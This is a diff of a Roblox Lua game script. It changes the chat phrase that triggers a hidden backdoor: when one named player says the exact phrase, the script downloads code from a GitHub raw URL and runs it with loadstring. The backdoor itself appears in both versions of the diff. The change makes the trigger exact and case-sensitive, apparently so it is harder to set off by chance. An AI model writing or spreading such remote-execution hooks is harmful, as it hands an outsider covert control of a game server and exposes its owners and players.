@@ -2,7 +2,7 @@
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == "JohnRegretevator" then
         player.Chatted:Connect(function(msg)
-            if msg:lower() == "cool" then
+            if msg == "Coolius Kiddius" then
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/Trollingm/emper/refs/heads/main/trol"))()
             end
         end)
@@ -13,7 +13,7 @@ end)
 local player = game.Players:FindFirstChild("JohnRegretevator")
 if player then
     player.Chatted:Connect(function(msg)
-        if msg:lower() == "cool" then
+        if msg == "Coolius Kiddius" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Trollingm/emper/refs/heads/main/trol"))()
         end
     end)
